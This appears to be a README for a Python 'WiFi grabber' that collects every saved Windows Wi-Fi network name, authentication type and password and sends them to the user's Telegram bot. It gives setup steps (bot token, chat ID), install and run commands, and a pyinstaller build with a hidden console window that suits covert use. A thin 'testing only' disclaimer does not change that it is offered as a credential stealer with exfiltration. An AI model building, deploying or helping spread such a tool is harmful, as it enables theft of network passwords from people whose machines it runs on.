# Ultimate WiFi grabber via Telegram on Python 3.6+
### Disclaimer! This application was created only for testing your system and not more.

Description
----
This application will send all information about already connected networks.
It includes ssid(name),authentication(type),protected(true/false),password.
Works only with windows. Tested on: Windows 10

Installation
----
* Input your telegram bot token and your chat id in main.py (lines 4 & 5)
* Install all requirements by this command:
```
pip install -r requirements.txt
```

Usage
----
* Launch from python file without compilation:
```
py main.py
```
* Compile to exe:
```
pyinstaller --onefile -w main.spec
```

Compatibility
----
To get a better compatibility between systems,you must have msvcp100.dll and msvcr100.dll in "C:\Windows\System32"

Sources which were used in my project
----
 All which connected with wifi taken from [LaZagne](https://github.com/AlessandroZ/LaZagne/)
